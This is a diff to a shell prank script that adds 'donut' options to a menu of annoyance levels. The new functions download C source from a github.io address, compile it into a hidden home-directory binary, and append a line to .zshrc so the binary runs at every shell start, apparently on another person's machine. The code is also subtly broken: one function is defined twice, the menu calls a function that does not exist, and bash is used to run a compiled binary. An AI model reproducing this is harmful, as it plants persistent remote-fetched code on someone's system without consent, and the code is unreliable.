@@ -58,6 +58,24 @@ function fixed_parrot {
 	bash ~/.doit.sh
 }
 
+function normal_donut {
+	touch ~/donut
+	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
+	gcc ~/donut.c -o ~/donut
+	echo "echo \"bash ~/donut\" >> ~/.zshrc" > ~/.doit.sh
+	bash ~/.doit.sh
+}
+
+function normal_donut {
+	touch ~/donut
+	chmod 755 ~/donut
+	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
+	gcc ~/donut.c -o ~/.donut
+	rm ~/donut.c
+	echo "echo \"bash ~/.donut&\" >> ~/.zshrc" > ~/.doit.sh
+	bash ~/.doit.sh
+}
+
 function recurring {
 	echo
 	echo "*** Parrot is placed in .zshrc ***"
@@ -82,6 +100,8 @@ chmod 755 ~/.doit.sh
 echo "Choose your level of annoyance:"
 options=("normal parrot"
 	"fixed parrot"
+	"normal_donut"
+	"fixed_donut"
 	"cancel and exit")
 
 case `select_opt "${options[@]}"` in 
@@ -89,5 +109,9 @@ case `select_opt "${options[@]}"` in
 		recurring ;;
 	1)	fixed_parrot 
 		recurring ;;
-	2)	;;
+	2)	normal_donut
+		recurring ;;
+	3)	fixed_donut
+		recurring ;;
+	4)	;;
 esac
